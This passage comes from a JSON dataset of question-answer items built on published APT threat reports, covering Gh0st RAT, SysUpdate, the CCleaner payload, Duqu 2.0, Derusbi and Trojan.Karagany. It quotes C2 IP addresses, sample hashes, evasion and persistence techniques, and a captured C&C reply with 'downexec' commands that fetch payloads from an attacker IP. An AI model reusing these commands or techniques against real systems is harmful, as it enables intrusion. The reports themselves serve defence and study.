    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: \"You look like you've seen a Gh0st RAT\"\nLike ZxShell, publicly available Gh0st RAT source code led to the emergence of several different variants. In a 2018 campaign, BRONZE UNION likely deployed modified Gh0st RAT malware to multiple systems within a compromised environment that were important to the threat actors' objective. When executed with administrator privileges, the Gh0st\nRAT binary file was written to %System%\\FastUserSwitchingCompatibilitysex.dll. The installer then created a Windows service and associated service dynamic link library (DLL) chosen from the names listed in Table 1.\nThis Gh0st RAT sample communicated with IP address 43 . 242 . 35 . 16 on TCP port 443, although the traffic is a custom binary protocol and not HTTPS. The malware author also modified the standard Gh0st RAT headers to obfuscate the network traffic (see Figure 2).\nBytes 0-4, which are typically known as the Gh0st RAT \"identifier,\" are randomized in this case. Bytes 5-8 indicate the packet size, and bytes 9-12 indicate the zlib-decompressed packet size. In a departure from previous Gh0st RAT versions, the five bytes at the end of this packet are an XOR key, which must be applied to the packet data before the zlib decompression can be performed. The XOR key is different for each execution of the malware. Once the packet is decoded and decompressed, the data shown in Figure 3 is visible.\nThe first byte of Figure 3 shows the value 0x66, which is the Gh0st RAT code for \"login\". After sending the initial phone-home request, Gh0st RAT exchanges 22-byte 'command' packets with its command and control (C2) server. Once again, the first five bytes are randomized and the zlib-compressed part of the packet is XOR-encoded, but the same identifiable structure remains. In the example command packet shown in Figure 4, the first five bytes are the randomized header and the next eight bytes show the compressed and uncompressed size of the data. The XOR key for this packet is 0x7c.\nBig Headline: Creating custom solutions\nIn addition to publicly available tools, BRONZE UNION has also used proprietary remote access tools such as and since 2016. Despite self-developed tools generally benefitting from lower detection rates than publicly available tools, the threat actors appear to use their own tools more sparingly after securing consistent network access.\nSysUpdate is a multi-stage malware used exclusively by BRONZE UNION. It has been delivered by multiple methods. In one instance observed by CTU researchers, it was downloaded by a malicious Word document using the Dynamic Data Exchange () embedded command method. In another incident, the threat actor manually deployed SysUpdate via previously stolen credentials after gaining access to the environment. In a third case, it was delivered via a redirect from a strategic web compromise (SWC). Regardless of the delivery method, the payload is a WinRAR self-extracting (SFX) file that installs the SysUpdate stage 1 payload.\nThe stage 1 payload is responsible for the following tasks:\ninstalling the stage 1 malware through\nsetting up persistence by configuring either a registry Run key (see Figure 5) or an \"Own Process\" Windows service depending on privileges available at the time of installation\ncontacting a C2 server to retrieve and install a second malware payload\nSysUpdate stage 1 has no capability beyond downloading the second payload file, SysUpdate Main (see Figure 6).\nSysUpdate Main employs HTTP communications and uses the hard-coded User-Agent \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36\". It downloads a file named m.bin using the HTTP GET method and injects this file into a new svchost.exe process without saving the file to disk. After performing this download, SysUpdate Main reverts to its binary protocol for any additional commands from the C2 server, beaconing every three minutes. The SysUpdate Main file analyzed by CTU researchers included remote access capabilities such as managing files and processes, launching a command shell, interacting with services, taking screenshots, and uploading and downloading additional malware payloads.\nSysUpdate is flexible malware, as capabilities can be easily introduced and withdrawn by supplying a new payload file. The operator could remove second-stage capabilities at any time and revert to the first stage by supplying a replacement payload file. By withdrawing second-stage payloads when not in use, operators can limit exposure of their full capabilities if the malicious activity is detected.\nBig Headline: Conclusion\nBRONZE UNION was one of the most prolific and active targeted threat groups tracked by CTU researchers in 2017 and 2018. The threat actors have access to a wide range of tools, so they can operate flexibly and select tools appropriate for intrusion challenges. During complex intrusion scenarios, the threat actors leverage their proprietary tools, which offer custom functionality and lower detection rates. They appear to prefer using widely available tools and web shells to maintain access to networks over longer periods. After accessing a network, the threat actors are adept at circumventing common security controls, escalating privileges, and maintaining their access to high-value systems over long periods of time.\n\nQ: Why might BRONZE UNION prefer to use widely available tools and web shells for maintaining long-term access to networks, despite having access to proprietary tools with custom functionality and lower detection rates?",
    "output": "A: BRONZE UNION prefers to use widely available tools and web shells for maintaining long-term access to networks because these tools are less likely to raise suspicion and can blend in with legitimate system activities. While proprietary tools offer custom functionality and lower detection rates, their unique signatures can potentially alert security teams to the presence of an advanced persistent threat. By using common tools, BRONZE UNION can operate more stealthily and increase the likelihood of remaining undetected over extended periods.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: The Next Connection\nStarting from the stage 2 payload, I reverse engineered the module, extracting other hidden shellcode and binaries within. After uploading the different binaries to (<http://www.intezer.com/intezer-analyze/>)Intezer Analyze\u2122, the final payload (that I have access to) had a match with a binary relating to the Axiom group.\nBinary in screenshot:\nf0d1f88c59a005312faad902528d60acbf9cd5a7b36093db8ca811f763e1292a\nRelated APT17 samples:\n07f93e49c7015b68e2542fc591ad2b4a1bc01349f79d48db67c53938ad4b525d 0375b4216334c85a4b29441a3d37e61d7797c2e1cb94b14cf6292449fb25c7b2 20cd49fd0f244944a8f5ba1d7656af3026e67d170133c1b3546c8b2de38d4f27 ee362a8161bd442073775363bf5fa1305abac2ce39b903d63df0d7121ba60550\nNot only did the first payload have shared code between the Axiom group and CCBkdr, but the second did as well. The above photo shows the same function between two binaries. Let me put this into better context for you: out of all the billions and billions of pieces of code (both trusted and malicious) contained in the Intezer Code Genome Database, we found this code in only these APTs. It is also worth noting that this isn't a standard method one would use to call an API. The attacker used the simple technique of employing an array to hide a string from being in clear sight of those analyzing the binary (although to those who are more experienced, it is obvious) and remain undetected from antivirus signatures. The author probably copied and pasted the code, which is what often happens to avoid duplicative efforts: rewriting the same code for the same functionality twice.\nDue to the uniqueness of the shared code, we strongly concluded that the code was written by the same attacker.\nBig Headline: Technical Analysis:\nThe stage two payload that was analyzed in this report (dc9b5e8aa6ec86db8af0a7aa897ca61db3e5f3d2e0942e319074db1aaccfdc83), after launching the infected version of CCleaner, was dropped to only a selective group of targets, as reported by Talos. Although there is an x64 version, the following analysis will only include the x86 version because they are nearly identical. I will not be going too far in depth as full comprehension of the technical analysis will require an understanding of reverse engineering.\nInstead of using the typical API (VirtualAlloc) to allocate memory, the attackers allocated memory on the heap using LocalAlloc, and then copied a compressed payload to the allocated memory.\nIt looks like the attackers used version 1.1.4 of zlib to decompress the payload into this allocated memory region.\nDepending on if you're running x86 or x64 Windows, it will drop a different module. (32-bit\n07fb252d2e853a9b1b32f30ede411f2efbb9f01e4a7782db5eacf3f55cf34902, 64-bit 128aca58be325174f0220bd7ca6030e4e206b4378796e82da460055733bb6f4f) Both modules are actually legitimate software with additional code and a modified execution flow.\nThe last modified time on the modules is changed to match that of the msvcrt.dll that is located in your system32 folder\u2013a technique to stay under the radar by not being able to check last modified files.\nSome shellcode and another module are written to the registry.\nAfter the module is successfully dropped, a service is created under the name Spooler or SessionEnv, depending upon your environment, which then loads the newly dropped module.\nThe new module being run by the service allocates memory, reads the registry where the other payload is located, and then copies it to memory.\nThe next payload is executed, which decrypts another module and loads it. If we look at the memory of the next decrypted payload, we can see something that looks like a PE header without the MZ signature. From here, it is as simple as modifying the first two bytes to represent MZ and we have a valid PE file. (f0d1f88c59a005312faad902528d60acbf9cd5a7b36093db8ca811f763e1292a)\nThe next module is a essentially another backdoor that connects to a few domains; before revealing the true IP, it will connect to for the next stage payload.\nIt starts by ensuring it receives the correct response from (<https://www.microsoft.com/>)https://www.microsoft.com and (<https://update.micrsoft.com/>)https://update.microsoft.com.\nThe malware proceeds to decrypt two more URLs.\nThe malware authors used steganography to store the IP address in a ptoken field of the HTML.\nHere you can see the GitHub page with the ptoken field.\nThe value is then XOR decrypted by 0x31415926 which gives you 0x5A093B0D or the IP address: 13.59.9.90\nBig Headline: About Intezer:\nThrough its 'DNA mapping' approach to code, Intezer provides enterprises with unparalleled threat detection that accelerates incident response and eliminates false positives, while protecting against fileless malware, APTs, code tampering and vulnerable software.\nCurious to learn what's next for Intezer? Join us on our journey toward achieving these endeavors here on the blog or (<https://intezer.viewpage.co/free-community-edition>)request a community free edition invite\n\nBased on the above text, answer a question. What methods did the attackers use to allocate memory and deploy the payload in the stage two attack of the CCleaner hack, and how did they ensure the payload remained hidden?",
    "output": "The attackers allocated memory on the heap using LocalAlloc instead of the typical API VirtualAlloc, and then copied a compressed payload to the allocated memory. They used version 1.1.4 of zlib to decompress the payload into this allocated memory region. To ensure the payload remained hidden, the attackers modified the last modified time on the modules to match that of the msvcrt.dll located in the system32 folder. Additionally, some shellcode and another module were written to the registry, and a service was created under the name Spooler or SessionEnv to load the newly dropped module.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: About CERT-ISAC\nCERT-ISAC is India's first Independent CERT for mobile and electronic security. Established by the non-profit scientific foundation \"Information Sharing and Analysis Center\" (ISAC) that manages the National security Database (NSD) program, CERT-ISAC has a dedicated 30 seat threat intelligence monitoring center at New Delhi and Mumbai to monitor constant threats and attacks on the India Cyber Space. CERT-ISAC has numerous security experts from the National Security Database program who regularly support the research initiatives.\nRead the text above and answer this question: How does CERT-ISAC leverage its resources and infrastructure to monitor and respond to threats in the Indian cyberspace?",
    "output": "CERT-ISAC leverages its resources and infrastructure by maintaining dedicated 30-seat threat intelligence monitoring centers in New Delhi and Mumbai. These centers are staffed by numerous security experts from the National Security Database program, who constantly monitor threats and attacks on the Indian cyberspace. This setup allows CERT-ISAC to effectively track and respond to ongoing cybersecurity incidents, ensuring a robust defense against potential threats.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: 2.4. Format of the (encrypted) configuration file\nUnder the encryption layer (which is identical in the new and old samples as described in the previous section), the configuration file format of the new Duqu 2.0 samples is very similar to the old Duqu config file format. For an overview, see Figure 5 below.\nThe format is designed to hold key-value pairs. The keys are always 4-byte long, and the values can be of arbitrary size. We believe that the keys are timestamps and the values are configuration entries, although the file format could hold any other similarly structured information (e.g. configurations).\nThe old file format begins with 4 bytes whose value is undefined. In the serialization process, it is read from an uninitialized buffer, and it is ignored in the deserialization process. The new file format does not have such a beginning byte sequence.\nThe main part of the file format is surrounded by 4 signature bytes at the beginning and at the end. The byte sequence in the old Duqu file format is 0x839172FF, and in the new Duqu 2.0 version, it is 0x7749CB4D.\nIn both cases, the next integer indicates the number of entries, followed by the entries themselves.\nEach entry begins with a 4-byte key, and then the value. In the new format, the value always begins with 13 bytes (that can be logically divided into four 4 byte integers and a 1 byte value: 4+4+1+4+4), but in the old format, this is missing. Furthermore, the value contains a variable size part in both formats. This is a length prefixed buffer that can hold arbitrary data.\nIn essence, the only difference between the Duqu and the Duqu 2.0 config file formats is the presence of the undefined 4 bytes at the beginning of the file in the old version, and the presence of the 13 additional value bytes in the new version.\nMedium Headline: 2.5. Logging functions\nWe've identified a characteristic logging function that is present in both Duqu and Duqu 2.0, and is used extensively in the networking (mainly HTTP handling) part of the code. The logging function itself is identical, and the data structure used for storing log entries is very similar.\nThe Duqu version of the data structure has embedded function pointers, while the Duqu 2.0 version uses a virtual function table like structure. The main difference from a C++ virtual function table is that the pointer to the table is the last field of the associated structure instead of the first field (see Figure 6).\nIn general, change in the coding style can be seen all over the code. While Duqu uses object oriented style that is similar, but not identical to what C++ compilers do, Duqu 2.0 moved mainly to \"real\" C++, but there are still deviations from the standard C++ style (like the previously function table).\nBoth the Duqu and Duqu 2.0 avoids storing the messages logged through this function. In both codebase, a \"handle_log_entry\" function is called after creating the log entry structure, but this function throws the object away (frees the memory) and does not print or save it. The authors probably used C/C++ macros to avoid detailed logging in release builds, but in this case we still see the logging function invocation. In this case, the macro was probably placed in the function that should have printed the log message (handle_log_entry), and since this is a virtual function, the compiler could not optimize out the function invocations directly.\nThe logging function is called equal times in the Duqu and the Duqu 2.0 samples, and the invocation is always very similar (see Figure 7). The arguments are usually not strings describing the event directly, but 4 byte magic numbers. The logging function is invoked equal times, and the magic numbers are almost always identical in Duqu and Duqu 2.0.\nSmall Headline: GifServer:\nDuqu has used a very unique user agent string when communicating over HTTP:\nMozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.9)\nIn contrast, Duqu 2.0 chooses user agent string randomly from a large set of often used values listed in Sample 7.\nThe following list shows the browser agent strings found in Duqu 2.0:\nMozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\nMozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0\nMozilla/5.0 (Windows NT 6.2) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4\nMozilla/5.0 (Windows NT 6.1; Win64; x64; rv:5.0) Gecko/20110619 Firefox/5.0\nMozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)\nMozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)\nMozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4325)\nMozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.1; SV1; .NET CLR 2.8.52393; WOW64; en-US)\nMozilla/5.0 (Windows NT 6.1) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.77 Safari/535.7ad-imcjapan-syosyaman-xkgi3lqg03!wgz\nMozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; FDM; .NET CLR 1.1.4322)\nMozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET CLR 1.1.4322; .NET4.0C; Tablet PC 2.0)\nMozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB6.5; QQDownload 534; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC2; .NET CLR 2.0.50727; Media Center PC 6.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\nMozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322)\nMozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205\nMozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20120716 Firefox/15.0a2\nMozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.66 Safari/535.11\nMozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11\nMozilla/5.0 (Windows NT 6.2) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.26 Safari/537.11\nSample 7 \u201348 Browser agent strings in Duqu 2.0\nMedium Headline: 2.7. DLL imports\nDuqu 2.0 uses more than one method to import functions from DLLs. One of the methods utilizes a hash method to represent function names as 4 byte integers. It iterates through all importable function and finds the one whose function name hash matches the given hash. This hash function uses a magic number. A very similar import method and hash function is used in Duqu and Duqu 2.0 although the magic numbers are different: 0x86F186F1 and 0xB31FB31F. Note that even the inner structure of the magic numbers are similar (2x2 bytes).\nSample 8 \u2013 Hash function used for imports in Duqu and Duqu 2.0\nMedium Headline: 3.1. Detection based on communications\nThe malware can transmit information through HTTP traffic. It is most likely that one or more infected computers can be proxy points towards the attacker, meaning that other infected computers communicate with these proxies. These proxies can act as HTTP or HTTPS servers. For HTTPS, a self signed certificate is created by the malware itself. (Most likely by contacting gpl3.selfsigned.org). The Common Name (CN) field seems to be \"*\" in the created certificate. During data transfer, the malware uses <5 random numbers>.gif for file name and a 843-byte GIF file + additional random bytes. The transmissions may be protected by AES.\nOne possible way to detect such transmission (if cleartext traffic is somehow available) to detect the actual 843-byte GIF file. For the known two samples, this GIF portion was identical.\nThe actual image in hex dump is the following:\nSample 9 \u2013 Hexdump of the actual GIF image\nThe image itself is a small picture, basic color is yellow and there are some orange dots in it:\nSample 10 \u2013 The actual GIF image\nQ: What methods does Duqu 2.0 use to import functions from DLLs, and how do these methods compare to those used in the original Duqu? What are the implications of these methods for malware analysis and detection?",
    "output": "Duqu 2.0 employs multiple methods to import functions from DLLs, one of which involves using a hash method to represent function names as 4-byte integers. This method iterates through all importable functions to find a match based on the hash. Both Duqu and Duqu 2.0 use a similar import method and hash function, but with different magic numbers: 0x86F186F1 for Duqu and 0xB31FB31F for Duqu 2.0. Despite the difference in magic numbers, the inner structure remains similar. These methods make it challenging for analysts to identify the specific functions being imported, thereby complicating the analysis and detection of the malware.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Recent Cloud Atlas activity\nBy GReAT\nAlso known as Inception, Cloud Atlas is an actor that has a long history of cyber-espionage (<https://securelist.com/cloud-atlas-redoctober-apt-is-back-in-style/68083/>)operations targeting industries and governmental entities. We first reported and we've been following its activities ever since.\nFrom the beginning of 2019 until July, we have been able to identify different spear-phishing campaigns related to this threat actor mostly focused on Russia, Central Asia and regions of Ukraine with ongoing military conflicts.\nCloud Atlas hasn't changed its TTPs (Tactic Tools and Procedures) since 2018 and is still relying on its effective existing tactics and malware in order to compromise high value targets.\nThe Windows branch of the Cloud Atlas intrusion set still uses spear-phishing emails to target high profile victims. These emails are crafted with Office documents that use malicious remote templates \u2013 whitelisted per victims \u2013 hosted on remote servers. We (<https://unit42.paloaltonetworks.com/unit42-inception-attackers-target-europe-year-old-office-vulnerability/>)and our colleagues at .\nPreviously, Cloud Atlas dropped its \"validator\" implant named \"PowerShower\" directly, after exploiting the Microsoft Equation vulnerability (CVE-2017-11882) mixed with CVE-2018-0802. During recent months, we have seen a new infection chain, involving a polymorphic HTA, a\nnew and polymorphic VBS implant aimed at executing PowerShower, and the Cloud Atlas (<https://securelist.com/cloud-atlas-redoctober-apt-is-back-in-style/68083/>)second stage modular backdoor that we disclosed and which remains unchanged.\nRead the text above and answer this question: How does the Cloud Atlas APT group leverage Tactics, Techniques, and Procedures (TTPs) to compromise high-value targets, and what changes have they made to their infection chain recently?",
    "output": "Cloud Atlas, also known as Inception, primarily relies on spear-phishing emails to target high-profile victims. These emails contain Office documents that utilize malicious remote templates hosted on remote servers, which are whitelisted per victim. Initially, Cloud Atlas employed the 'validator' implant called 'PowerShower' directly after exploiting the Microsoft Equation vulnerability (CVE-2017-11882) combined with CVE-2018-0802. However, in recent months, they have adopted a new infection chain. This updated chain involves a polymorphic HTA (HTML Application), a new and polymorphic VBS (Visual Basic Script) implant designed to execute PowerShower, and the second stage modular backdoor that remains unchanged. This evolution in their infection chain demonstrates their adaptability while maintaining the effectiveness of their existing tactics.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: Why did the Dropping Elephant threat actor focus on targets related to China's foreign relations, and how did they achieve this?",
    "output": "The Dropping Elephant threat actor focused on targets related to China's foreign relations due to the concentration of visits from IPs located in China. This focus was achieved through ongoing social engineering themes that were constant throughout the attacks. The concentration of visits from China could be attributed to various reasons such as diplomatic staff visiting these sites from their offices, Chinese academics and analysts researching CN-focused think tanks, or some IPs being unknown and not self-identifying as bots or scrapers. The main interest of the attackers was likely the foreign relations efforts, as multiple targets were identified as diplomatic and governmental entities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Overview\nThere are two types of Derusbi malware: a client-server model and a server-client model. Both types provide basic RAT functionality with the distinction between the two being largely the directionality of the communication. This report will focus on the server-client variant (or simply, the \"server variant\") of Derusbi, which acts as a server on a victim's machine and waits for commands from a controlling client.\nIn and of itself, the Derusbi server variant is a largely unremarkable RAT when viewed from the perspective of functional capabilities. The server variant supports basic RAT functionality such as file management (uploading and downloading), network tunneling and remote command shell. What makes the server variant interesting is the device driver that the variant installs.\nThe server variant utilizes a device driver in order to hook into the Windows firewall by either using largely undocumented Windows Firewall hooking techniques found in Windows XP and older or by using the documented Windows Filtering Platform found in Windows Vista and later. The driver, after hooking the firewall using either of the two mentioned interfaces, will inspect incoming network packets. If a specific handshake occurs between the client and the server variant, the remainder of the communication session for the established session will be redirected to the server variant. If the driver does not detect the appropriate handshake, then the network traffic is allowed to pass unobstructed. This allows an attacker to hide their communication within a cluster of network sessions originating from a single IP such as would be the case for a client performing multiple HTTP requests against a web server.\n\nHow does the Derusbi server variant utilize a device driver to facilitate covert communication, and what are the implications of this technique for network traffic analysis?",
    "output": "The Derusbi server variant employs a device driver to hook into the Windows firewall, utilizing either undocumented techniques for Windows XP and older versions or the documented Windows Filtering Platform for Windows Vista and later. This driver inspects incoming network packets for a specific handshake between the client and the server variant. Upon detecting the correct handshake, the driver redirects the remainder of the communication session to the server variant. If the handshake is not detected, the network traffic passes through unobstructed. This method allows attackers to conceal their communication within a cluster of network sessions originating from a single IP, making it challenging for defenders to distinguish malicious traffic from legitimate traffic. This technique complicates network traffic analysis and enhances the stealthiness of the attack.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Trojan.Karagany\nTrojan.Karagany is a back door used primarily for recon. It is designed to download and install additional files and exfiltrate data. Samples sometimes use common binary packers such as UPX and Aspack on top of a custom Delphi binary packer/protector for the payload. Where present in samples, the Delphi packer is configured to use 'neosphere' as a key to decrypt the payload.\nThe following is a brief overview of the functionality of Trojan.Karagany:\n\u2022 Can upload, download, and execute files on the system\n\u2022 Has plugin capability (may load several plugins for added functionality, such as Web injects)\n\u2022 Payload is approximately 72Kb in size and is programmed in C/C++\n\u2022 Contains a small embedded DLL file, which monitors WSASend and send APIs for capturing 'Basic Authentication' credentials\nSmall Headline: Installation\nTrojan.Karagany creates a folder in the user APPDATA directory and chooses the directory name from the following list:\n\u2022 Microsoft WCF services\n\u2022 Broker services\n\u2022 Flash Utilities\n\u2022 Media Center Programs\n\u2022 Policy Definitions\n\u2022 Microsoft Web Tools\n\u2022 Reference Assemblies\n\u2022 Analysis Services\n\u2022 InstallShield Information\n\u2022 IIS SQL Server\n\u2022 Diagnostics\n\u2022 NTAPI Performance\n\u2022 WPF Platform\nIt copies itself in the created directory with hidden and system attributes using a file name chosen from the following list:\n\u2022 SearchIndexer.exe\n\u2022 ImeBroker.exe\n\u2022 fsutil.exe\n\u2022 PnPutil.exe\n\u2022 BdeUISrv.exe\n\u2022 WinSAT.exe\n\u2022 pwNative.exe\n\u2022 SnippingTool.exe\n\u2022 DFDWizard.exe\n\u2022 PrintBrmEngine.exe\n\u2022 WbemMonitor.exe\n\u2022 dxpserver.exe\n\u2022 PowerMng.exe\nTrojan.Karagany copies itself with hidden and system attributes where it was first executed as err.log[DIGITS]. It then copies the legitimate chkdsk utility in the installation folder using the payload file name but with a space before the file extension. This may fool ordinary users into thinking that this folder contains a legitimate application, for example PnPutil .exe. Trojan.Karagany!gen1 may create the following additional files in the installation folder:\n\u2022 Form.api\n\u2022 inact.api\n\u2022 prog.cer\n\u2022 Cent.api\n\u2022 ie.pdb\nIt then creates a C:\\ProgramData\\Mail\\MailAg\\gl directory as a temporary directory used for uploading files. Trojan.Karagany then creates a link to itself in the Startup folder as an autostart when the system restarts.\nVery Small Headline: Example HTTP Requests\nInternet connection test to Microsoft\nGET /en-us/default.aspx HTTP/1.1\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nHost: microsoft.com\nCookie: MC1=V=3&GUID=<32 character guid>\nConnection: Keep-Alive\nCache-control: no-cache\nInternet connection test to Adobe using identifiant parameter\nPOST /geo/productid.php HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\nHost: adobe.com\n...\nidentifiant=51032 _ 175129256364\nExample POST request for C&C server check-in\nPOST /check _ value.php HTTP/1.1\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; .NET CLR\n2.0.50727)\nHost: 93.188.161.235\n...\nidentifiant=51032 _ 1799883375637&version=i2pver\nHTTP response example\nVery Small Headline: HTTP/1.1 200 OK\nDate: Tue, 28 Jan 2014 05:59:58 GMT\nVary: Accept-Encoding\nContent-Length: 324\nContent-Type: text/html\nX-Powered-By: PHP/5.3.10-1ubuntu3.9\nVia: 1.1 host.alexsieff.com\nwork:3|downexec [http://]93.188.161.235/check2/muees27jxt/shot.jpg;   work:5|downexec [http://]93.188.161.235/check2/muees27jxt/tl.jpg;   work:7|downexec [http://]93.188.161.235/check2/muees27jxt/fl.jpg;   work:103|downexec [http://]93.188.161.235/check2/muees27jxt/pdump.jpg;   work:118|downexec [http://]93.188.161.235/check2/muees27jxt/fl.jpg;\nThe POST data contains the operating system version and a derived number:\n\u2022 identifiant=[OS VERSION]_[DERIVED NUMBER]\nUser-Agent tokens used in C&C requests are hard-coded. The following two examples have been observed:\n\u2022 Mozilla/17.0 (compatible; MSIE 8.0; Windows NT 6.1; .NET CLR 2.0.50727; .NET CLR 3.5.30729)\n\u2022 Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; .NET CLR 2.0.50727; .NET CLR 3.5.30729)\nBig Headline: About Symantec\nSymantec protects the world's information and is the global leader in security, backup, and availability solutions. Our innovative products and services protect people and information in any environment\u2014from the smallest mobile device to the enterprise data center to cloud-based systems.\nOur industry-leading expertise in protecting data, identities, and interactions gives our customers confidence in a connected world. More information is available at www.symantec.com or by connecting with Symantec at .\nHeadquartered in Mountain View, Calif.,\nSymantec has operations in 40 countries.\nMore information is available at .\nFor specific country offices and contact numbers, please visit our website.\nSymantec World Headquarters 350 Ellis St.\nMountain View, CA 94043 USA\n+1 (650) 527-8000\n1 (800) 721-3934\nwww.symantec.com\nCopyright \u00a9 2014 Symantec Corporation. All rights reserved. Symantec, the Symantec Logo, and the Checkmark Logo are trademarks or registered trademarks of Symantec Corporation or its affiliates in the U.S. and other countries. Other names may be trademarks of their respective owners.\nAny technical information that is made available by Symantec Corporation is the copyrighted work of Symantec Corporation and is owned by Symantec Corporation.\nNO WARRANTY . The technical information is being delivered to you as is and Symantec Corporation makes no warranty as to its accuracy or use. Any use of the technical documentation or the information contained herein is at the risk of the user. Documentation may include technical or other inaccuracies or typographical errors. Symantec reserves the right to make changes without prior notice.\nDragonfly: Cyberespionage Attacks Against Energy Suppliers\n\nQuestion: How does Trojan.Karagany, used by Dragonfly, ensure persistence on a compromised system? Describe the steps it takes to achieve this.\n\nAnswer:",
    "output": "Trojan.Karagany ensures persistence on a compromised system through several steps. First, it creates a folder in the user APPDATA directory with a name chosen from a predefined list, such as 'Microsoft WCF services' or 'Broker services'. It then copies itself into this directory with hidden and system attributes, using a file name from another predefined list, such as 'SearchIndexer.exe' or 'ImeBroker.exe'. Additionally, it copies the legitimate chkdsk utility into the installation folder with a space before the file extension to mimic a legitimate application. Trojan.Karagany also creates a link to itself in the Startup folder to ensure it starts automatically when the system restarts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: WHOIS Record for ournation-school.com:\nDomain Name: ournation-school.com\nRegistry Domain ID:\nRegistrar WHOIS Server:whois.paycenter.com.cn\nRegistrar URL:http://www.xinnet.com\nUpdated Date:2012-06-28 13:22:20\nCreation Date:2004-10-29 00:00:00\nRegistrar Registration Expiration Date:2014-10-29 00:00:00\nRegistrar:XINNET TECHNOLOGY CORPORATION\nRegistrar IANA ID:120\nsupervision@xinnet.com\nRegistrar Abuse Contact Email:\nRegistrar Abuse Contact Phone:+86.1087128064\nDomain Status:\nRegistry Registrant ID:\nRegistrant Name:Korea 615 Shenyang company\nRegistrant Organization:chaoxian liuyiyubianjishe shenyangbanshichu\nRegistrant Street:shenyang hepingqu xifudalu 168 hao 2 danyuan 2-12-1\nRegistrant City:shenyangshi\nRegistrant State/Province:liaoningsheng\nRegistrant Postal Code:123456\nChina\nRegistrant Country:\nRegistrant Phone:+86.024 22523102\nRegistrant Phone Ext:\nRegistrant Fax:+86.024 22523102\nRegistrant Fax Ext:\nurimanager@silibank.com\nRegistrant Email:\nRegistry Admin ID:\nKorea 615 Shenyang company\nAdmin Name:\nAdmin Organization:Korea 615 Shenyang company\nAdmin Street:shenyang hepingqu xifudalu 615 hao 2 danyuan 6-1-5\nAdmin City:shenyangshi\nAdmin State/Province:liaoningsheng\nAdmin PostalCode:123456\nAdmin Country:China\nAdmin Phone:+86.024 22523102\nAdmin Phone Ext:\nAdmin Fax:+86.024 22523102\nAdmin Fax Ext:\nAdmin Email:urimanager@silibank.com\nRegistry Tech ID:\nTech Name:Korea 615 Shenyang company\nTech Organization:Korea 615 Shenyang company\nTech Street:shenyang hepingqu xifudalu 615 hao 2 danyuan 6-1-5\nTech City:shenyangshi\nTech State/Province:liaoningsheng\nTech PostalCode:123456\nTech Country:China\nTech Phone:+86.024 22523102\nTech Phone Ext:\nTech Fax:+86.024 22523102\nTech Fax Ext:\nTech Email:urimanager@silibank.com\nName Server:ns13.xincache.com\nName Server:ns14.xincache.com\nDNSSEC:unsigned\nMedium Headline: WHOIS Record for chongryon.com:\nDomain Name: chongryon.com\nRegistry Domain ID: 69711868_DOMAIN_COM-VRSN\nwhois.melbourneit.com\nRegistrar WHOIS Server:\nRegistrar URL: http://www.melbourneit.com.au\nUpdated Date: 2014-03-26T00:31:24Z\nCreation Date: 2001-04-20T06:45:46Z\nRegistrar Registration Expiration Date: 2015-04-20T06:45:46Z\nRegistrar: Melbourne IT Ltd\nRegistrar IANA ID: 13\nRegistrar Abuse Contact Email: abuse@melbourneit.com.au\nRegistrar Abuse Contact Phone: +61.386242300\nDomain Status: ok\nRegistry Registrant ID:\no guanin\nRegistrant Name:\nRegistrant Organization: o guanin\nRegistrant Street: \"hujimi2-14-15,\"\nRegistrant City: chiyodaku\nRegistrant State/Province: tokyo\nRegistrant Postal Code: 1028138\nJP\nRegistrant Country:\nRegistrant Phone: +81.332627111\nRegistrant Phone Ext:\nRegistrant Fax:\nRegistrant Fax 